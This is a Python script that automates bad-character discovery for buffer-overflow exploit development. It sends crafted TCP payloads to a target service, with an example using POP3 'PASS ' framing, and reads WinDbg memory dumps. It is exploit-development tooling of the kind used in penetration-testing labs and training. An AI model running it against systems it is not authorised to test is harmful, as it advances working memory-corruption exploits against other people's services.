#!/usr/bin/env python3
"""
Automated bad character discovery via WinDbg memory dump.

Requires the WinDbg script (scripts/badchar_bp.wds) to be active in the
debugger before running. See that file for setup instructions.

Example:
    python auto_badchars.py --host 192.168.1.50 --port 110 --offset 2606 --size 3000

For protocol-wrapped services (SMTP, FTP, etc.), use --prefix/--suffix:
    python auto_badchars.py --host 192.168.1.50 --port 110 \\
        --offset 2606 --size 3000 \\
        --prefix "PASS " --suffix "\\r\\n"
"""

import argparse
import sys

from Tools.badchars.windbg_loop import BadCharLoop, make_tcp_sender


def parse_hex_list(s):
    # type: (str) -> list
    return [int(x.strip(), 16) for x in s.split(",") if x.strip()]


def unescape(s):
    # type: (str) -> bytes
    """Convert \\r\\n style escape sequences in CLI args to real bytes."""
    return s.encode("raw_unicode_escape").decode("unicode_escape").encode("latin-1")


def main():
    # type: () -> int
    parser = argparse.ArgumentParser(
        description="Automated bad character finder using WinDbg .writemem dumps"
    )
    parser.add_argument("--host", required=True, help="Target IP")
    parser.add_argument("--port", required=True, type=int, help="Target port")
    parser.add_argument("--offset", required=True, type=int,
                        help="Byte offset to the test sequence in the payload")
    parser.add_argument("--size", required=True, type=int,
                        help="Total payload size in bytes")
    parser.add_argument("--dump", default=r"C:\badchar\dump.bin",
                        help="Path where WinDbg writes dump.bin (must match WDS script)")
    parser.add_argument("--exclude", default="00",
                        help="Comma-separated hex bytes to exclude, e.g. 00,0a,0d")
    parser.add_argument("--timeout", type=int, default=15,
                        help="Seconds to wait for dump file per iteration")
    parser.add_argument("--prefix", default="",
                        help="Protocol prefix prepended to each payload (supports \\r\\n)")
    parser.add_argument("--suffix", default="",
                        help="Protocol suffix appended to each payload (supports \\r\\n)")
    parser.add_argument("--max-iter", type=int, default=30,
                        help="Maximum iterations before giving up")
    args = parser.parse_args()

    exclude = tuple(parse_hex_list(args.exclude))
    prefix = unescape(args.prefix) if args.prefix else b""
    suffix = unescape(args.suffix) if args.suffix else b""

    base_sender = make_tcp_sender(args.host, args.port)

    if prefix or suffix:
        def sender(payload):
            base_sender(prefix + payload + suffix)
    else:
        sender = base_sender

    loop = BadCharLoop(
        sender=sender,
        offset=args.offset,
        total_size=args.size,
        dump_path=args.dump,
        exclude=exclude,
        timeout=args.timeout,
    )

    print("[*] Target: {}:{}".format(args.host, args.port))
    print("[*] Offset: {}  Total size: {}".format(args.offset, args.size))
    print("[*] Excluded: {}".format(args.exclude))
    print("[*] Dump path: {}".format(args.dump))
    print("[*] Waiting for WinDbg breakpoint to fire on each send...\n")

    try:
        bad = loop.run_full(max_iterations=args.max_iter)
    except TimeoutError as e:
        print("[-] {}".format(e), file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\n[!] Aborted")
        return 1

    print("\n[+] Final exclude list:")
    print(", ".join("0x{:02x}".format(b) for b in bad))
    return 0


if __name__ == "__main__":
    sys.exit(main())
